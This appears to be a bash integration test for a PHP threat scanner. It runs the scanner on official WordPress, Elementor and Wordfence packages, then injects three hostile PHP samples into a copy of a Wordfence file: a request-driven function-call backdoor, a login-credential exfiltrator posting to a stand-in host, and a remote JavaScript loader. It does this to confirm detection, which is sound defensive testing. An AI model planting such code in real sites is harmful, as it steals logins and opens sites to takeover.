#!/usr/bin/env bash
# Network-only integration test. Official packages are inert, temporary inputs.
set -euo pipefail
REPO="$(cd "$(dirname "$0")/.." && pwd)"
TMP=$(mktemp -d "${TMPDIR:-/tmp}/presswarden-php-upstream.XXXXXX")
trap 'rm -rf "$TMP"' EXIT
mkdir -p "$TMP/packages" "$TMP/corpus"
fetch() {
  curl --fail --silent --show-error --location --proto '=https' --proto-redir '=https' \
    --connect-timeout 20 --max-time 180 --retry 2 --max-filesize 167772160 "$1" -o "$2"
}
fetch 'https://downloads.wordpress.org/plugin/elementor.4.2.4.zip' "$TMP/packages/elementor.zip"
fetch 'https://downloads.wordpress.org/plugin/wordfence.9.0.0.zip' "$TMP/packages/wordfence.zip"
fetch 'https://wordpress.org/wordpress-7.1.zip' "$TMP/packages/wordpress.zip"
(cd "$TMP/packages" && sha256sum -c "$REPO/tests/upstream-corpus.sha256")
python3 - "$TMP" <<'PY'
import pathlib, stat, sys, zipfile
root = pathlib.Path(sys.argv[1]); count = size = 0
for archive in sorted((root / 'packages').glob('*.zip')):
    with zipfile.ZipFile(archive) as z:
        for item in z.infolist():
            p = pathlib.PurePosixPath(item.filename)
            if item.is_dir() or p.suffix.lower() not in ('.php', '.phtml'):
                continue
            if p.is_absolute() or '..' in p.parts or stat.S_ISLNK(item.external_attr >> 16):
                raise SystemExit('unsafe archive member')
            if item.file_size > 5 * 1024 * 1024:
                print('OUTSIDE PHP SIZE SCOPE:', item.filename); continue
            count += 1; size += item.file_size
            if count > 10000 or size > 512 * 1024 * 1024:
                raise SystemExit('corpus budget exceeded')
            dest = root / 'corpus' / p; dest.parent.mkdir(parents=True, exist_ok=True)
            dest.write_bytes(z.read(item))
if count < 1000:
    raise SystemExit('unexpectedly small PHP corpus')
print(f'Official PHP corpus: {count} files; {size} bytes')
PY
find "$TMP/corpus" -type f -print0 > "$TMP/paths"
php -d memory_limit=64M "$REPO/lib/php-threat-cli.php" < "$TMP/paths" > "$TMP/results"
if [ -s "$TMP/results" ]; then cat "$TMP/results" >&2; exit 1; fi
printf 'Official PHP corpus: zero findings\n'
# Familiar security-plugin paths do not exempt injected code from inspection.
python3 - "$TMP" <<'PY'
import pathlib, sys
root = pathlib.Path(sys.argv[1]); original = root / 'corpus/wordfence/lib/wfUtils.php'
if not original.is_file():
    raise SystemExit('expected Wordfence reference missing')
source = original.read_bytes().rstrip()
if source.endswith(b'?>'):
    source += b'\n<?php\n'
payloads = [
    b'function pw_control_a(){ $f=$_REQUEST["f"]; $f(); }',
    b'function pw_control_b(){ $h=curl_init("https://example.invalid/collect"); curl_setopt($h,CURLOPT_SSL_VERIFYPEER,false); curl_setopt($h,CURLOPT_POSTFIELDS,["u"=>$_POST["log"],"p"=>$_POST["pwd"]]); curl_exec($h); }',
    b'function pw_control_c(){ if(is_admin() && current_user_can("manage_options")){ $ua=$_SERVER["HTTP_USER_AGENT"]; if(strpos($ua,"Windows")!==false){ $r=wp_remote_get("https://example.invalid/browser"); $js=base64_decode(wp_remote_retrieve_body($r)); wp_add_inline_script("app",$js); }}}'
]
with (root / 'injected-paths').open('wb') as paths:
    for number, payload in enumerate(payloads):
        dest = root / f'injected-{number}/wordfence/lib/wfUtils.php'
        dest.parent.mkdir(parents=True, exist_ok=True)
        dest.write_bytes(source + b'\n' + payload + b'\n')
        paths.write(str(dest).encode() + b'\0')
PY
php -d memory_limit=64M "$REPO/lib/php-threat-cli.php" < "$TMP/injected-paths" > "$TMP/injected-results"
for rule in PW-PHP-004 PW-PHP-005 PW-PHP-006; do
  [ "$(grep -c "$rule" "$TMP/injected-results")" -eq 1 ] || { cat "$TMP/injected-results" >&2; exit 1; }
done
printf 'Injected official Wordfence controls: 3/3 detected\n'
